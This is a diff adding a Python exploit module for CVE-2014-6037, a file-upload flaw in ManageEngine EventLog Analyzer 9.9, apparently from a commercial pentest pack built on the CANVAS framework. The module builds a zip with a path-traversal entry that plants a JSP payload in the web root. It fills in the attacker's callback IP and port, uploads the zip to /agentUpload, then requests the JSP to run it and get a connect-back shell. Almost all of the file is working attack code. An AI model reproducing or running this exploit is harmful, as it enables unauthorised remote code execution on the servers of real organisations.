@@ -1,0 +1,145 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+import sys
+import time
+import os
+import random
+import io
+import zipfile
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "ManageEngine EventLog Analyzer 9.9 File Upload Remote Code Execution Vulnerability"
+
+DESCRIPTION = "File Upload Remote Code Execution vulnerability in ManageEngine EventLog Analyzer"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "ManageEngine"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "9.9 build 9002"
+DOCUMENTATION["Date public"] = "2014.08.31"
+DOCUMENTATION["References"] = "https://www.mogwaisecurity.de/advisories/MSA-2014-01.txt"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2014-6037"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6037"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_eventlog/d2.jsp"    
+    self.protocol = "http"
+    self.port = 8400
+    self.sslport = 8443
+    self.https = 0
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):  
+    # Open JSP file
+    f = open(self.filename, "r")
+    fdata = f.read()
+    f.close()
+    
+    fdata = fdata.replace("CALLBACK_IP", self.callback.ip)
+    fdata = fdata.replace("CALLBACK_PORT", str(self.callback.port))    
+        
+    # Upload JSP file                         
+    url = "/agentUpload"
+    
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    files = {
+        '../../webapps/event/d2.jsp': fdata
+    }
+
+    zdata = io.BytesIO()
+    with zipfile.ZipFile(zdata, 'w') as zip:
+        for path in files:
+            zip.writestr(path, files[path])
+    zdata.seek(0)
+    zbuff = zdata.read()
+    
+    data = "------z5Ns7xWtW13bOyd\r\nContent-Disposition: form-data; name=\"file\"; filename=\"d2.zip\"\r\nContent-Type: application/x-zip-compressed\r\nContent-Length:%d\r\n\r\n"%len(zbuff)
+    data = data + zbuff + "\r\n------z5Ns7xWtW13bOyd--\r\n"      
+            
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    handle = spkproxy.urlopen(mainurl, exploit=self, data=data, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"), ("Content-Type", "multipart/form-data; boundary=----z5Ns7xWtW13bOyd")], verb="POST")    
+	
+    # Execute uploaded JSP file
+    url = "/d2.jsp"
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    handle = spkproxy.urlopen(mainurl, exploit=self, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")])
+    data = handle.read()  
+            		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
